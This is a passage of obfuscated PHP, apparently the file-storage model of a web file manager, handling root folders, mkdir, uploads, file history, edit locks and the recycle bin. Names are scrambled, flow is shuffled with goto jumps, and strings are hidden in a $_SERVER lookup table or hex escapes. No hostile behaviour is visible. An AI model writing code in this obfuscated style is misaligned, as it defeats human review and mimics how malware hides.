unset($aÀøùßØ¤[$F¡Åå à[28]]); foreach ($aÀøùßØ¤ as $F¶´÷‚¹è¿ => $B³Ë×Ó¿‚) { $f¶ã§“‚Î‹[$F¡Åå à[2329] . $F¶´÷‚¹è¿] = $B³Ë×Ó¿‚; } $cšÊÙÉ½ëÄ = array($F¡Åå à[483], $F¡Åå à[2193] . $C¢°Èˆ¤ö[$F¡Åå à[2191]] . $F¡Åå à[2193]); goto cËá‘¥Œƒá; bá¾’ğ ù: $f¶ã§“‚Î‹ = array(); $dª­‡£Éä = str_replace(array($F¡Åå à[217], $F¡Åå à[50], $F¡Åå à[2328]), $F¡Åå à[33], $dª­‡£Éä); $dª­‡£Éä = $F¡Åå à[2329] . str_replace($F¡Åå à[47], $F¡Åå à[2330], $dª­‡£Éä); goto BÖ÷•ÇÛ¾ï; cËá‘¥Œƒá: $f¶ã§“‚Î‹[] = array($F¡Åå à[2331] => $cšÊÙÉ½ëÄ, $F¡Åå à[918] => $F¡Åå à[2195], array($F¡Åå à[2332] => $cšÊÙÉ½ëÄ, $F¡Åå à[2333] => array($F¡Åå à[7], array($F¡Åå à[416], $F¡Åå à[415])))); $this->join($EÙÊ§õåƒ); $aÀøùßØ¤ = $f¶ã§“‚Î‹; goto cÂø‚ŒÎ‹¼; f†Šøòî“§: $F¡Åå à =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!Input::check($C¢°Èˆ¤ö[$F¡Åå à[2191]], $F¡Åå à[306]) || strlen($C¢°Èˆ¤ö[$F¡Åå à[2191]]) < 2) { return; } $EÙÊ§õåƒ = "\x4c\105\x46\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\x69\x6f\137\x73\157\165\x72\x63\145\137\x6d\x65\x74\x61\40\155\145\x74\x61\40\157\156\40\163\x6f\x75\162\143\145\56\x73\157\x75\162\143\145\x49\104\x20\75\x20\x6d\145\164\141\x2e\163\x6f\x75\x72\x63\145\x49\x44"; goto bá¾’ğ ù; cÂø‚ŒÎ‹¼: } private function _parseSearchWhere($B¸øğİ‰šÓ) { goto CÔ°í³£Å; dŞêá»ŞÌ‰: if (isset($B¸øğİ‰šÓ[$bøØœŠÖ‘â[2191]]) && $B¸øğİ‰šÓ[$bøØœŠÖ‘â[2191]]) { $F°“¡Ù™¯˜ = $B¸øğİ‰šÓ[$bøØœŠÖ‘â[2191]]; $aòÃ„â˜Çµ = explode($bøØœŠÖ‘â[50], $F°“¡Ù™¯˜); if (strlen($F°“¡Ù™¯˜) > 2 && (substr($F°“¡Ù™¯˜, 0, 1) == $bøØœŠÖ‘â[113] && substr($F°“¡Ù™¯˜, -1) == $bøØœŠÖ‘â[113]) || substr($F°“¡Ù™¯˜, 0, 1) == $bøØœŠÖ‘â[55] && substr($F°“¡Ù™¯˜, -1) == $bøØœŠÖ‘â[55]) { $F°“¡Ù™¯˜ = substr($F°“¡Ù™¯˜, 1, -1); $aòÃ„â˜Çµ = array($F°“¡Ù™¯˜); } $eÌÈ™õ¹é[$bøØœŠÖ‘â[28]] = array($bøØœŠÖ‘â[483], $bøØœŠÖ‘â[2193] . $F°“¡Ù™¯˜ . $bøØœŠÖ‘â[2193]); if (count($aòÃ„â˜Çµ) > 1) { $eÌÈ™õ¹é[$bøØœŠÖ‘â[28]] = array(); foreach ($aòÃ„â˜Çµ as $F“ìÖìÚÃ) { if (!trim($F“ìÖìÚÃ)) { continue; } $eÌÈ™õ¹é[$bøØœŠÖ‘â[28]][] = array($bøØœŠÖ‘â[483], $bøØœŠÖ‘â[2193] . trim($F“ìÖìÚÃ) . $bøØœŠÖ‘â[2193]); } } } return $eÌÈ™õ¹é; goto D˜ãÙŠÓƒ; e¹ÑéÎ¨©: if (isset($B¸øğİ‰šÓ[$bøØœŠÖ‘â[706]])) { $EĞê·½¬­Ü = array($bøØœŠÖ‘â[2335], $B¸øğİ‰šÓ[$bøØœŠÖ‘â[706]]); if ($eÌÈ™õ¹é[$bøØœŠÖ‘â[107]]) { $eÌÈ™õ¹é[$bøØœŠÖ‘â[107]] = array($eÌÈ™õ¹é[$bøØœŠÖ‘â[107]], $EĞê·½¬­Ü, $bøØœŠÖ‘â[2336]); } else { $eÌÈ™õ¹é[$bøØœŠÖ‘â[107]] = $EĞê·½¬­Ü; } } if (isset($B¸øğİ‰šÓ[$bøØœŠÖ‘â[2337]])) { $eÌÈ™õ¹é[$bøØœŠÖ‘â[77]] = array($bøØœŠÖ‘â[2334], $B¸øğİ‰šÓ[$bøØœŠÖ‘â[2337]]); } if (isset($B¸øğİ‰šÓ[$bøØœŠÖ‘â[2338]])) { $EĞê·½¬­Ü = array($bøØœŠÖ‘â[2335], $B¸øğİ‰šÓ[$bøØœŠÖ‘â[2338]]); if ($eÌÈ™õ¹é[$bøØœŠÖ‘â[77]]) { $eÌÈ™õ¹é[$bøØœŠÖ‘â[77]] = array($eÌÈ™õ¹é[$bøØœŠÖ‘â[77]], $EĞê·½¬­Ü, $bøØœŠÖ‘â[2336]); } else { $eÌÈ™õ¹é[$bøØœŠÖ‘â[77]] = $EĞê·½¬­Ü; } } goto A¾ªõÚËÒ…; CÔ°í³£Å: $bøØœŠÖ‘â =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eÌÈ™õ¹é = array(); if (isset($B¸øğİ‰šÓ[$bøØœŠÖ‘â[705]])) { $eÌÈ™õ¹é[$bøØœŠÖ‘â[107]] = array($bøØœŠÖ‘â[2334], $B¸øğİ‰šÓ[$bøØœŠÖ‘â[705]]); } goto e¹ÑéÎ¨©; A¾ªõÚËÒ…: if (isset($B¸øğİ‰šÓ[$bøØœŠÖ‘â[535]])) { $eÌÈ™õ¹é[] = array($bøØœŠÖ‘â[379] => $B¸øğİ‰šÓ[$bøØœŠÖ‘â[535]], $bøØœŠÖ‘â[378] => $B¸øğİ‰šÓ[$bøØœŠÖ‘â[535]], $bøØœŠÖ‘â[918] => $bøØœŠÖ‘â[2195]); } if (isset($B¸øğİ‰šÓ[$bøØœŠÖ‘â[372]])) { $D±¡’­³ = $B¸øğİ‰šÓ[$bøØœŠÖ‘â[372]]; if ($D±¡’­³ == $bøØœŠÖ‘â[76]) { $eÌÈ™õ¹é[$bøØœŠÖ‘â[370]] = 1; } else { if ($D±¡’­³ == $bøØœŠÖ‘â[2339]) { $eÌÈ™õ¹é[$bøØœŠÖ‘â[370]] = 0; } else { if ($D±¡’­³) { $D±¡’­³ = is_array($D±¡’­³) ? $D±¡’­³ : explode($bøØœŠÖ‘â[47], $D±¡’­³); $eÌÈ™õ¹é[$bøØœŠÖ‘â[372]] = array($bøØœŠÖ‘â[384], $D±¡’­³); $eÌÈ™õ¹é[$bøØœŠÖ‘â[370]] = 0; } } } } if (isset($B¸øğİ‰šÓ[$bøØœŠÖ‘â[461]])) { $A‹¿Ú×‘³É = $this->sourceInfo($B¸øğİ‰šÓ[$bøØœŠÖ‘â[461]]); $eÌÈ™õ¹é[$bøØœŠÖ‘â[525]] = array($bøØœŠÖ‘â[483], $A‹¿Ú×‘³É[$bøØœŠÖ‘â[459]] . $B¸øğİ‰šÓ[$bøØœŠÖ‘â[461]] . $bøØœŠÖ‘â[484]); } goto dŞêá»ŞÌ‰; D˜ãÙŠÓƒ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Bà¼œƒ‰) { $dˆ‹´ÄÑÀ” =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÎ‹ˆ»×´ = Model($dˆ‹´ÄÑÀ”[474])->where(array($dˆ‹´ÄÑÀ”[1436] => $Bà¼œƒ‰))->find(); $Dé•¿¥‚Ä = $this->_mkdirRoot(SourceModel::TYPE_USER, $Bà¼œƒ‰, $EÎ‹ˆ»×´[$dˆ‹´ÄÑÀ”[28]]); $this->userDesktopAdd($Dé•¿¥‚Ä); return $Dé•¿¥‚Ä; } public function userDesktopAdd($dÒ’¢äší) { $D—ÉÚ…Âµé =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C”á‘„ºº® = LNG($D—ÉÚ…Âµé[2340]); $dÏ‘ÇÓ–Ã» = $this->mkdir($dÒ’¢äší, $C”á‘„ºº®); $this->metaSet($dÏ‘ÇÓ–Ã», $D—ÉÚ…Âµé[2341], $D—ÉÚ…Âµé[83]); $this->metaSet($dÒ’¢äší, $D—ÉÚ…Âµé[2342], $dÏ‘ÇÓ–Ã»); } public function groupRootAdd($Aì„÷ä”—®) { $e›é‡Í ˆÔ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÁ½¢¢ƒ‹á = Model($e›é‡Í ˆÔ[458])->where(array($e›é‡Í ˆÔ[2187] => $Aì„÷ä”—®))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Aì„÷ä”—®, $aÁ½¢¢ƒ‹á[$e›é‡Í ˆÔ[28]]); } public function systemRootPathAdd($A‚‹¢õÜ‰¨) { if ($A‚‹¢õÜ‰¨ != $_SERVER[³‘’¼äÑ™ÔÍ][1093]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $A‚‹¢õÜ‰¨); } public function userRootRemove($EªùŸ„°—) { $FŠÅ§£¿Ğ£ = $this->sourceRoot(SourceModel::TYPE_USER, $EªùŸ„°—); if (!$FŠÅ§£¿Ğ£) { return; } $this->remove($FŠÅ§£¿Ğ£, !1); } public function groupRootRemove($a´¯ßàç°) { $AÎ²Òãò  = $this->sourceRoot(SourceModel::TYPE_GROUP, $a´¯ßàç°); if (!$AÎ²Òãò ) { return; } $this->remove($AÎ²Òãò , !1); } private function _mkdirRoot($c±ê²Á°æ, $AšÊ†øÀ©Ø, $c£ŸÁ’š£É) { goto bÁ¯áñ©Ç; bÁ¯áñ©Ç: $c­Ø©™ÉÛĞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E³¶îÄ‚ = array($c­Ø©™ÉÛĞ[368] => 0, $c­Ø©™ÉÛĞ[521] => $c±ê²Á°æ, $c­Ø©™ÉÛĞ[522] => $AšÊ†øÀ©Ø, $c­Ø©™ÉÛĞ[518] => 1, $c­Ø©™ÉÛĞ[523] => USER_ID, $c­Ø©™ÉÛĞ[524] => USER_ID, $c­Ø©™ÉÛĞ[519] => $c­Ø©™ÉÛĞ[33], $c­Ø©™ÉÛĞ[525] => $c­Ø©™ÉÛĞ[470], $c­Ø©™ÉÛĞ[396] => 0, $c­Ø©™ÉÛĞ[520] => 0, $c­Ø©™ÉÛĞ[420] => 0, $c­Ø©™ÉÛĞ[526] => $c­Ø©™ÉÛĞ[33]); if ($Dî«…òÇ–Â = $this->where($E³¶îÄ‚)->find()) { return $Dî«…òÇ–Â[$c­Ø©™ÉÛĞ[369]]; } goto Bá»¡ÉÇØ ; Bá»¡ÉÇØ : $f…ÅŞ±á¼È = "\x4d\x6f\x64\x65\x6c\123\x6f\x75\x72\143\145\56\155\x6b\x64\151\162\122\157\x6f\164\56{$c±ê²Á°æ}\x2e{$AšÊ†øÀ©Ø}\56" . $c£ŸÁ’š£É; CacheLock::lock($f…ÅŞ±á¼È); $E³¶îÄ‚[$c­Ø©™ÉÛĞ[28]] = $c£ŸÁ’š£É; goto dí¾ÄÖö®Š; dí¾ÄÖö®Š: $d©°“³ô–› = $this->add($E³¶îÄ‚); $f˜¯åÉ˜–ó = array($c­Ø©™ÉÛĞ[527] => short_id($d©°“³ô–›)); $this->where(array($c­Ø©™ÉÛĞ[383] => $d©°“³ô–›))->save($f˜¯åÉ˜–ó); goto cŠîè¡Ë‡¬; cŠîè¡Ë‡¬: CacheLock::unlock($f…ÅŞ±á¼È); return $d©°“³ô–›; goto D–˜ŠİìÅ‘; D–˜ŠİìÅ‘: } private function sourceRoot($c¼Ü­ŸÒ—˜, $EÓÊ‘êÍ¶£, $DÉ¨Âˆ‡•ã = false) { $F‰ø£“¤êé =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Fø÷ïùÚª = array($F‰ø£“¤êé[368] => 0, $F‰ø£“¤êé[521] => $c¼Ü­ŸÒ—˜, $F‰ø£“¤êé[522] => $EÓÊ‘êÍ¶£); if ($a ×¼ö£­ = $this->where($Fø÷ïùÚª)->find()) { return $DÉ¨Âˆ‡•ã ? $a ×¼ö£­ : $a ×¼ö£­[$F‰ø£“¤êé[369]]; } return !1; } public function sourceRootGroup($C˜İ¶·š¡í) { $bÛ´ïíÀ£ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_string($C˜İ¶·š¡í)) { $C˜İ¶·š¡í = array($C˜İ¶·š¡í); } $EÊÓœã÷İŠ = array($bÛ´ïíÀ£[368] => 0, $bÛ´ïíÀ£[521] => SourceModel::TYPE_GROUP, $bÛ´ïíÀ£[522] => array($bÛ´ïíÀ£[7], $C˜İ¶·š¡í)); $E–¸íåÃ“ = $this->listSource($EÊÓœã÷İŠ, 1000); return array_to_keyvalue($E–¸íåÃ“[$bÛ´ïíÀ£[74]], $bÛ´ïíÀ£[456]); } public function mkfile($F¨Ä´”Ø¹˜, $F”«Š·™, $d‡ˆç¡½„§ = '', $CØÛ¹ù¦«å = REPEAT_RENAME) { $F’½¯¬²Œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $añäšÒ¾£È = Model($F’½¯¬²Œ[544])->addFileByContent($d‡ˆç¡½„§, $F”«Š·™); return $this->_createFileCall($F¨Ä´”Ø¹˜, $F”«Š·™, $añäšÒ¾£È, $CØÛ¹ù¦«å, $F’½¯¬²Œ[1132]); } public function addFile($cÁªñõ–‡, $AÃ‚‰Êƒšƒ, $eˆ¢ß©Ïƒ, $cÜáÁÕôš‡ = false, $Aä¼À‘øŸÆ = REPEAT_RENAME) { $Dø…Ä·ñÈ¤ = Model($_SERVER[³‘’¼äÑ™ÔÍ][544])->addFile($AÃ‚‰Êƒšƒ, $eˆ¢ß©Ïƒ, $cÜáÁÕôš‡); return $this->_createFileCall($cÁªñõ–‡, $eˆ¢ß©Ïƒ, $Dø…Ä·ñÈ¤, $Aä¼À‘øŸÆ); } public function addFileByFileID($cš¨±Àí£, $e“·ßì˜‘á, $E‚Íñ¤ÜŞÛ, $F¸¡‚ªˆØ = REPEAT_RENAME) { $e½İ¹Ú¤ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c÷¢¼‘é£¿ = Model($e½İ¹Ú¤[544])->find($e“·ßì˜‘á); Model($e½İ¹Ú¤[544])->linkAdd($e“·ßì˜‘á); return $this->_createFileCall($cš¨±Àí£, $E‚Íñ¤ÜŞÛ, $c÷¢¼‘é£¿, $F¸¡‚ªˆØ); } public function addFileByRemote($EÃ‰†ÅÒßš, $fù‚¢øÒŒš, $FÎÚµŠè, $B¾©¦Ğœ… = array(), $eÍŸ×ìœÙ = REPEAT_RENAME) { $Dæ…¥ŒîÕç = Model($_SERVER[³‘’¼äÑ™ÔÍ][544])->addFileByRemote($fù‚¢øÒŒš, $FÎÚµŠè, $B¾©¦Ğœ…); return $this->_createFileCall($EÃ‰†ÅÒßš, $FÎÚµŠè, $Dæ…¥ŒîÕç, $eÍŸ×ìœÙ); } private function _createFileCall($c±È½Ç¯¡, $CƒÑĞÅ‰Ë, $e¾¯”Ñ·Íá, $B¼íæ¦¦¨, $A‡È·Í§Çê = "\x75\x70\x6c\157\141\x64") { goto aåïÀä¹ŒË; aåïÀä¹ŒË: $dÚ‡îˆ·‚˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E’´ß©ˆèà = !1; $this->lockWriteStart($c±È½Ç¯¡, $CƒÑĞÅ‰Ë); goto Ağ¥Ğ­°­ù; BöË›Ëø–: return $F§àœªì‚; goto dˆßèÃĞÕˆ; Ağ¥Ğ­°­ù: $F§àœªì‚ = $this->_createFile($c±È½Ç¯¡, $CƒÑĞÅ‰Ë, $e¾¯”Ñ·Íá, $B¼íæ¦¦¨, $E’´ß©ˆèà); if (!$E’´ß©ˆèà) { Model($dÚ‡îˆ·‚˜[422])->remove($e¾¯”Ñ·Íá[$dÚ‡îˆ·‚˜[419]]); } else { if ($F§àœªì‚) { Model($dÚ‡îˆ·‚˜[2313])->eventCreate($F§àœªì‚, $A‡È·Í§Çê); } } $this->lockWriteEnd($c±È½Ç¯¡, $CƒÑĞÅ‰Ë); goto BöË›Ëø–; dˆßèÃĞÕˆ: } public function mkdir($D›Ë¾ğ Š, $A¤é”©˜˜Ì, $a˜ƒ§®æÓÒ = REPEAT_SKIP) { goto eé¾ÅÆÇÚ; fŠ‡ë¹‰‹á: $this->lockWriteStart($D›Ë¾ğ Š, $A¤é”©˜˜Ì); if ($a˜ƒ§®æÓÒ !== !1) { $cµâ”İŸ‡ø = $this->fileNameExist($D›Ë¾ğ Š, $A¤é”©˜˜Ì); if ($cµâ”İŸ‡ø && $a˜ƒ§®æÓÒ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($D›Ë¾ğ Š, $A¤é”©˜˜Ì); return $cµâ”İŸ‡ø; } $A¤é”©˜˜Ì = $this->fileNameAuto($D›Ë¾ğ Š, $A¤é”©˜˜Ì, $a˜ƒ§®æÓÒ); } $B­óÛ…¶âÜ = array($fÑà”íõšÛ[518] => 1, $fÑà”íõšÛ[386] => $A¤é”©˜˜Ì, $fÑà”íõšÛ[519] => $fÑà”íõšÛ[33], $fÑà”íõšÛ[420] => 0, $fÑà”íõšÛ[520] => 0); goto FÚÙÇ÷†«ï; eé¾ÅÆÇÚ: $fÑà”íõšÛ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DğñèáÚà = $this->sourceInfo($D›Ë¾ğ Š); if (!$DğñèáÚà) { return !1; } goto fŠ‡ë¹‰‹á; FÚÙÇ÷†«ï: $D¶­’·ªÈ = $this->_addSoure($B­óÛ…¶âÜ, $DğñèáÚà); Model($fÑà”íõšÛ[2313])->eventCreate($D¶­’·ªÈ, $fÑà”íõšÛ[1133]); $this->lockWriteEnd($D›Ë¾ğ Š, $A¤é”©˜˜Ì); goto BŒÍÈåĞàŞ; BŒÍÈåĞàŞ: return $D¶­’·ªÈ; goto Fîóè˜ë†­; Fîóè˜ë†­: } private function _createFile($AÜóøèÛŸ, $Bº˜õÍ¼œ, $B—†‚©Ïä, $Aìô¤Æ’¨˜, &$a«‘Š‚«Ë) { goto F’›¤ëƒë±; B²·Áöëå : $FŸŒ„Ò¹Ô‰ = array($C˜ğ•ÉÙ†ö[518] => 0, $C˜ğ•ÉÙ†ö[386] => $Bº˜õÍ¼œ, $C˜ğ•ÉÙ†ö[519] => get_path_ext($Bº˜õÍ¼œ), $C˜ğ•ÉÙ†ö[420] => $B—†‚©Ïä[$C˜ğ•ÉÙ†ö[419]], $C˜ğ•ÉÙ†ö[520] => $B—†‚©Ïä[$C˜ğ•ÉÙ†ö[77]]); $Aõ‰Å”‚áÓ = $this->_addSoure($FŸŒ„Ò¹Ô‰, $dÓœ…‰²…); $this->folderSizeReset($AÜóøèÛŸ); goto d§Àè£ó¨â; eïİŸÀÀß: if ($Aìô¤Æ’¨˜ !== !1) { $C®ÙÇ…’ö° = $this->fileNameExist($AÜóøèÛŸ, $Bº˜õÍ¼œ); } $a«‘Š‚«Ë = !0; if ($Aìô¤Æ’¨˜ && $C®ÙÇ…’ö°) { if ($Aìô¤Æ’¨˜ == REPEAT_SKIP) { $a«‘Š‚«Ë = !1; return $C®ÙÇ…’ö°; } else { if ($Aìô¤Æ’¨˜ == REPEAT_REPLACE) { $FÀËÎÆ‚õÓ = $this->sourceInfo($C®ÙÇ…’ö°); $AÄÊô±â© = $this->fileHistory($FÀËÎÆ‚õÓ, $B—†‚©Ïä[$C˜ğ•ÉÙ†ö[419]], $B—†‚©Ïä[$C˜ğ•ÉÙ†ö[77]]); if (!$AÄÊô±â©) { $a«‘Š‚«Ë = !1; } else { $this->folderSizeReset($AÜóøèÛŸ); } return $C®ÙÇ…’ö°; } else { $Bº˜õÍ¼œ = $this->fileNameAuto($AÜóøèÛŸ, $Bº˜õÍ¼œ, $Aìô¤Æ’¨˜, !1); } } } goto B²·Áöëå ; d§Àè£ó¨â: return $Aõ‰Å”‚áÓ; goto E†¦Çã½; F’›¤ëƒë±: $C˜ğ•ÉÙ†ö =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dÓœ…‰²… = $this->sourceInfo($AÜóøèÛŸ); if (!$B—†‚©Ïä || !$dÓœ…‰²…) { return !1; } goto eïİŸÀÀß; E†¦Çã½: } protected function fileHistory($BÏèÄ ´Ä§, $C‹ËÊóÍ§½, $FÏâöˆ×ÆÁ) { goto C¯øÄ’á‰Ø; C¯øÄ’á‰Ø: $BÏğÜö‚µ‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($BÏèÄ ´Ä§[$BÏğÜö‚µ‰[419]] == $C‹ËÊóÍ§½) { return !1; } $this->checkLock($BÏèÄ ´Ä§[$BÏğÜö‚µ‰[369]], $C‹ËÊóÍ§½); goto aÃÌ´‘â¥Î; aÃÌ´‘â¥Î: Model($BÏğÜö‚µ‰[2343])->addHistory($BÏèÄ ´Ä§); $eğ®á¬´¥ = array($BÏğÜö‚µ‰[524] => USER_ID, $BÏğÜö‚µ‰[390] => time(), $BÏğÜö‚µ‰[419] => $C‹ËÊóÍ§½, $BÏğÜö‚µ‰[77] => $FÏâöˆ×ÆÁ); $this->where(array($BÏğÜö‚µ‰[383] => $BÏèÄ ´Ä§[$BÏğÜö‚µ‰[369]]))->save($eğ®á¬´¥); goto C‹Ñ–Œøë‘; C‹Ñ–Œøë‘: return !0; goto bÉ„œ´Íëí; bÉ„œ´Íëí: } public function checkLock($E¬Ÿ‡Ñ, $B¿æäÀ˜®¾) { goto D†‹£šÇ‰÷; cµÕ¢ùí‰°: $CÖŒËß½ÃÇ = Session::get($cöÖø—½ÄŠ[2344]); $B…Œ‡äÎŒÏ = substr($fĞœ—•Õò[$cöÖø—½ÄŠ[28]], 0, -1 - strlen($fĞœ—•Õò[$cöÖø—½ÄŠ[160]])) . $cöÖø—½ÄŠ[1398] . $CÖŒËß½ÃÇ . $cöÖø—½ÄŠ[91] . $fĞœ—•Õò[$cöÖø—½ÄŠ[160]]; $Dçœßğ„Ï× = Model($cöÖø—½ÄŠ[544])->find($B¿æäÀ˜®¾); goto CÙë—Íîø; eõóºŞ»¨Õ: show_json(LNG($cöÖø—½ÄŠ[2346]) . $cöÖø—½ÄŠ[2347] . LNG($cöÖø—½ÄŠ[2348]) . $cöÖø—½ÄŠ[2349] . $F¤¢øÔ§ëò . $cöÖø—½ÄŠ[2350], !1); goto b‘‰÷â°ã; D†‹£šÇ‰÷: $cöÖø—½ÄŠ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fĞœ—•Õò = $this->pathInfo($E¬Ÿ‡Ñ); if (!$this->fileIsLock($fĞœ—•Õò, !0)) { return; } goto cµÕ¢ùí‰°; CÙë—Íîø: $this->_createFileCall($fĞœ—•Õò[$cöÖø—½ÄŠ[461]], $B…Œ‡äÎŒÏ, $Dçœßğ„Ï×, REPEAT_REPLACE, $cöÖø—½ÄŠ[1132]); $C¯Åõëñßø = $fĞœ—•Õò[$cöÖø—½ÄŠ[417]][$cöÖø—½ÄŠ[481]]; $F¤¢øÔ§ëò = $C¯Åõëñßø[$cöÖø—½ÄŠ[2345]] ? $C¯Åõëñßø[$cöÖø—½ÄŠ[2345]] : $C¯Åõëñßø[$cöÖø—½ÄŠ[28]]; goto eõóºŞ»¨Õ; b‘‰÷â°ã: } public function fileIsLock($fÏ¦‡Ä¾·, $cÖñœ’ôò = false) { goto AÎïøÎâŠÆ; B¨á¬Î›×: return !1; goto fÜ”à—©; fõßç—¸–: $f×‘ïÌ¿Øâ = $GLOBALS[$Dˆ©ˆöá÷›[6]][$Dˆ©ˆöá÷›[84]][$Dˆ©ˆöá÷›[479]]; if ($fÏ¦‡Ä¾·[$Dˆ©ˆöá÷›[417]][$Dˆ©ˆöá÷›[480]] <= time() - $f×‘ïÌ¿Øâ) { $this->metaSet($fÏ¦‡Ä¾·[$Dˆ©ˆöá÷›[369]], $Dˆ©ˆöá÷›[478], null); $this->metaSet($fÏ¦‡Ä¾·[$Dˆ©ˆöá÷›[369]], $Dˆ©ˆöá÷›[480], null); } if ($cÖñœ’ôò) { $this->metaSet($fÏ¦‡Ä¾·[$Dˆ©ˆöá÷›[369]], $Dˆ©ˆöá÷›[480], time()); } goto B¨á¬Î›×; AÎïøÎâŠÆ: $Dˆ©ˆöá÷› =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($fÏ¦‡Ä¾·[$Dˆ©ˆöá÷›[417]]) || !$fÏ¦‡Ä¾·[$Dˆ©ˆöá÷›[417]][$Dˆ©ˆöá÷›[478]]) { return !1; } if ($fÏ¦‡Ä¾·[$Dˆ©ˆöá÷›[417]][$Dˆ©ˆöá÷›[478]] != USER_ID) { return !0; } goto fõßç—¸–; fÜ”à—©: } private function _addSoure($dº°ñÅŠ·Š, $C¤ØÃ÷ªŸ¦) { goto bÒí¸î¦“ó; D¯¯±ª¯‡: $this->updateModifyTime($dº°ñÅŠ·Š[$C…Ö¿–Ø±»[461]]); $dÚ†ù“¯Ö¡ = $C…Ö¿–Ø±»[2351] . $C¤ØÃ÷ªŸ¦[$C…Ö¿–Ø±»[369]]; if (isset(self::$cacheChildList[$dÚ†ù“¯Ö¡])) { unset(self::$cacheChildList[$dÚ†ù“¯Ö¡]); } goto F¹¶ë¬åòé; C¹‘ŸÌ‚¡“: return $DùÏëœ†Î; goto bº×è§²¸Á; c¤ƒÜÅâ§«: $dÔ ¼¤„¦Á = array($C…Ö¿–Ø±»[527] => short_id($DùÏëœ†Î)); $this->where(array($C…Ö¿–Ø±»[383] => $DùÏëœ†Î))->save($dÔ ¼¤„¦Á); $this->setNamePinyin($DùÏëœ†Î, $dº°ñÅŠ·Š[$C…Ö¿–Ø±»[28]]); goto C¹‘ŸÌ‚¡“; bÒí¸î¦“ó: $C…Ö¿–Ø±» =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aˆ¥ »ÒÅ = array($C…Ö¿–Ø±»[521] => $C¤ØÃ÷ªŸ¦[$C…Ö¿–Ø±»[371]], $C…Ö¿–Ø±»[522] => $C¤ØÃ÷ªŸ¦[$C…Ö¿–Ø±»[456]], $C…Ö¿–Ø±»[523] => USER_ID, $C…Ö¿–Ø±»[524] => USER_ID, $C…Ö¿–Ø±»[368] => $C¤ØÃ÷ªŸ¦[$C…Ö¿–Ø±»[369]], $C…Ö¿–Ø±»[525] => $C¤ØÃ÷ªŸ¦[$C…Ö¿–Ø±»[459]] . $C¤ØÃ÷ªŸ¦[$C…Ö¿–Ø±»[369]] . $C…Ö¿–Ø±»[47], $C…Ö¿–Ø±»[396] => 0, $C…Ö¿–Ø±»[526] => $C…Ö¿–Ø±»[33]); $dº°ñÅŠ·Š = array_merge($aˆ¥ »ÒÅ, $dº°ñÅŠ·Š); goto D¯¯±ª¯‡; F¹¶ë¬åòé: static $fŞ¥Ôòíó = false; if (!$fŞ¥Ôòíó) { Hook::trigger($C…Ö¿–Ø±»[508], $dº°ñÅŠ·Š); $fŞ¥Ôòíó = !0; } $DùÏëœ†Î = $this->add($dº°ñÅŠ·Š); goto c¤ƒÜÅâ§«; bº×è§²¸Á: } public function remove($E°å¹Å•õ, $a‚µíİÛ¦± = true) { goto A¦¶¿Ïˆ; Cí²¶ÆÏôø: $aŞÑ©Í“Ÿ = Model($e™ªÈáÓÎ¨[1443])->get($e™ªÈáÓÎ¨[2352]) == $e™ªÈáÓÎ¨[83]; if ($e×ä™ÌáØ || $a‚µíİÛ¦± || !$aŞÑ©Í“Ÿ) { return $this->removeNow($E°å¹Å•õ, $a‚µíİÛ¦±); } $BÜó±÷Šø® = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto aÇÌ¼•©Â; dï¯³‘‚‚‰: $this->recycleClear($AôğÉºŒÌä); $c’ëªôôœ¤ = $this->move($E°å¹Å•õ, $a…„å¥°ğô, REPEAT_RENAME_FOLDER); $this->folderSizeReset($AôğÉºŒÌä[$e™ªÈáÓÎ¨[461]]); goto AÒ½£ëÉ; AÒ½£ëÉ: return $c’ëªôôœ¤; goto A²¦¬Û¼®Á; aÇÌ¼•©Â: $aˆ“¶Œáô = $AôğÉºŒÌä[$e™ªÈáÓÎ¨[371]] == self::TYPE_USER ? $e™ªÈáÓÎ¨[535] : $e™ªÈáÓÎ¨[975]; if ($aˆ“¶Œáô == $e™ªÈáÓÎ¨[535]) { $dµ™æƒŠ§ê = Model($e™ªÈáÓÎ¨[474])->getInfo($AôğÉºŒÌä[$e™ªÈáÓÎ¨[456]]); $dŞéøÒ = !empty($dµ™æƒŠ§ê[$e™ªÈáÓÎ¨[2345]]) ? $dµ™æƒŠ§ê[$e™ªÈáÓÎ¨[2345]] : $dµ™æƒŠ§ê[$e™ªÈáÓÎ¨[28]]; $dŞéøÒ = $e™ªÈáÓÎ¨[248] . $dŞéøÒ . $e™ªÈáÓÎ¨[2353] . $AôğÉºŒÌä[$e™ªÈáÓÎ¨[456]]; } else { $dµ™æƒŠ§ê = Model($e™ªÈáÓÎ¨[458])->getInfo($AôğÉºŒÌä[$e™ªÈáÓÎ¨[456]]); $dŞéøÒ = _get($dµ™æƒŠ§ê, $e™ªÈáÓÎ¨[28]); $dŞéøÒ = $e™ªÈáÓÎ¨[157] . $dŞéøÒ . $e™ªÈáÓÎ¨[2354] . $AôğÉºŒÌä[$e™ªÈáÓÎ¨[456]]; } $AÚ±øÑ£ò« = $e™ªÈáÓÎ¨[2355] . md5($dŞéøÒ); goto AÏ²—Êç˜ó; AÊÔ—İ›Õ: CacheLock::unlock($AÚ±øÑ£ò«); $this->metaSet($E°å¹Å•õ, $e™ªÈáÓÎ¨[2360], $AôğÉºŒÌä[$e™ªÈáÓÎ¨[461]]); $this->where(array($e™ªÈáÓÎ¨[369] => 